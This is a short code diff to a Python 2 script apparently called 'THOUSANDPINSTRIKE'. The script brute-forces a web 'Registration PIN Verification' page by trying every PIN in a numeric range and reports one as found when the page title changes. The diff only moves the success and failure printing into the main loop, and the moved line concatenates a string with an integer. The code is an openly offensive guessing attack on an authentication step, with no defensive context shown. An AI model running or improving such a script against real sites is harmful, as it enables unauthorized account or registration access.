@@ -44,9 +44,9 @@ def attempt_pin(pin):
 
     print pin
     if page_title(res) != 'Registration PIN Verification':
-        print "THOUSANDPINSTRIKE COMPLETE: " + pin
+        return True
     elif not 'NOTFOUND' in res.content:
-        print "Pin attempt failed."
+        return False
 
 
 def main(args):
@@ -62,7 +62,10 @@ def main(args):
     print "INITIATE THOUSANDPINSTRIKE"
     print "Starting: {0} End: {1}".format(args.start, args.end)
     for pin in range(args.start, args.end):
-        attempt_pin(str(pin))
+        if attempt_pin(str(pin)):
+            print "THOUSANDPINSTRIKE COMPLETE: " + pin
+        else:
+            print "Pin attempt failed."
 
 
 if __name__ == '__main__':
